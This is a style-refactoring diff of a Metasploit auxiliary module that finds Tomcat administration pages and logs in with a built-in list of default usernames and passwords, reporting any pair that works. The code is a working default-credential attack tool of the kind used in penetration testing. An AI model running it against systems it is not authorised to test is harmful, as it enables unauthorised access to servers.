@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::WmapScanServer
   include Msf::Auxiliary::Scanner
@@ -17,7 +17,7 @@ class MetasploitModule < Msf::Auxiliary
       'Description' => 'Detect the Tomcat administration interface.',
       'References'  =>
         [
-          ['URL', 'http://tomcat.apache.org/'],
+          ['URL', 'http://tomcat.apache.org/']
         ],
       'Author'      => 'Matteo Cantoni <goony[at]nothink.org>',
       'License'     => MSF_LICENSE
@@ -27,104 +27,100 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(8180),
         OptString.new('TOMCAT_USER', [ false, 'The username to authenticate as', '']),
-        OptString.new('TOMCAT_PASS', [ false, 'The password for the specified username', '']),
-      ], self.class)
+        OptString.new('TOMCAT_PASS', [ false, 'The password for the specified username', ''])
+      ], self.class
+    )
   end
 
-  def run_host(ip)
-
+  def run_host(_ip)
     begin
       res = send_request_raw(
         {
           'method'  => 'GET',
-          'uri'     => '/',
-        }, 25)
+          'uri'     => '/'
+        }, 25
+      )
 
-      http_fingerprint({ :response => res })
+      http_fingerprint(response: res)
 
-      if (res and res.code == 200)
+      if res && (res.code == 200)
 
         ver = ""
 
-        if res.body.match(/<title>Apache Tomcat\/(.*)<\/title>/)
-          ver = "Apache Tomcat/" + $1
+        if res.body =~ /<title>Apache Tomcat\/(.*)<\/title>/
+          ver = "Apache Tomcat/" + Regexp.last_match(1)
         end
 
         user = datastore['TOMCAT_USER'].to_s
         pass = datastore['TOMCAT_PASS'].to_s
 
-        if user.length == 0
-          default_usernames = ['admin','manager','role1','root','tomcat']
-        else
-          default_usernames = [user]
-        end
+        default_usernames = if user.empty?
+                              ['admin', 'manager', 'role1', 'root', 'tomcat']
+                            else
+                              [user]
+                            end
 
-        if pass.length == 0
-          default_passwords = ['admin','manager','role1','root','tomcat']
-        else
-          default_passwords = [pass]
-        end
+        default_passwords = if pass.empty?
+                              ['admin', 'manager', 'role1', 'root', 'tomcat']
+                            else
+                              [pass]
+                            end
 
         default_usernames.each do |username|
           default_passwords.each do |password|
-
             res = send_request_raw({
-              'method'  => 'GET',
-              'uri'     => '/admin/',
-            }, 25)
+                                     'method' => 'GET',
+                                     'uri' => '/admin/'
+                                   }, 25)
 
-            if res && res.code == 200
+            next unless res && res.code == 200
 
-              if res.get_cookies.match(/JSESSIONID=(.*);(.*)/i)
+            next unless res.get_cookies =~ /JSESSIONID=(.*);(.*)/i
 
-                jsessionid = $1
+            jsessionid = Regexp.last_match(1)
 
-                post_data = "j_username=#{username}&j_password=#{password}"
+            post_data = "j_username=#{username}&j_password=#{password}"
 
-                res = send_request_cgi({
-                  'uri'          => '/admin/j_security_check',
-                  'method'       => 'POST',
-                  'content-type' => 'application/x-www-form-urlencoded',
-                  'cookie'       => "JSESSIONID=#{jsessionid}",
-                  'data'         => post_data,
-                }, 25)
+            res = send_request_cgi({
+                                     'uri' => '/admin/j_security_check',
+                                     'method'       => 'POST',
+                                     'content-type' => 'application/x-www-form-urlencoded',
+                                     'cookie'       => "JSESSIONID=#{jsessionid}",
+                                     'data'         => post_data
+                                   }, 25)
 
-                if (res and res.code == 302)
+            next unless res && (res.code == 302)
 
-                  res = send_request_cgi({
-                    'uri'     => "/admin/",
-                    'method'  => 'GET',
-                    'cookie'  => "JSESSIONID=#{jsessionid}",
-                  }, 25)
+            res = send_request_cgi({
+                                     'uri' => "/admin/",
+                                     'method'  => 'GET',
+                                     'cookie'  => "JSESSIONID=#{jsessionid}"
+                                   }, 25)
 
-                  if (res and res.code == 302)
+            next unless res && (res.code == 302)
 
-                    res = send_request_cgi({
-                      'uri'     => "/admin/frameset.jsp",
-                      'method'  => 'GET',
-                      'cookie'  => "JSESSIONID=#{jsessionid}",
-                    }, 25)
+            res = send_request_cgi({
+                                     'uri' => "/admin/frameset.jsp",
+                                     'method'  => 'GET',
+                                     'cookie'  => "JSESSIONID=#{jsessionid}"
+                                   }, 25)
 
-                    if (res and res.code == 200)
-                      print_status("http://#{target_host}:#{rport}/admin [#{res.headers['Server']}] [#{ver}] [Tomcat Server Administration] [#{username}/#{password}]")
-                    end
-
-                    # LogOut
-                    res = send_request_cgi({
-                      'uri'          => '/admin/logOut.do',
-                      'method'       => 'GET',
-                      'cookie'       => "JSESSIONID=#{jsessionid}",
-                    }, 25)
-                  end
-                end
-              end
+            if res && (res.code == 200)
+              print_status("http://#{target_host}:#{rport}/admin [#{res.headers['Server']}] [#{ver}] [Tomcat Server Administration] [#{username}/#{password}]")
             end
+
+            # LogOut
+            res = send_request_cgi({
+                                     'uri' => '/admin/logOut.do',
+                                     'method'       => 'GET',
+                                     'cookie'       => "JSESSIONID=#{jsessionid}"
+                                   }, 25)
           end
         end
       end
 
-      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-      rescue ::Timeout::Error, ::Errno::EPIPE
+    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+    rescue ::Timeout::Error, ::Errno::EPIPE
     end
   end
 end
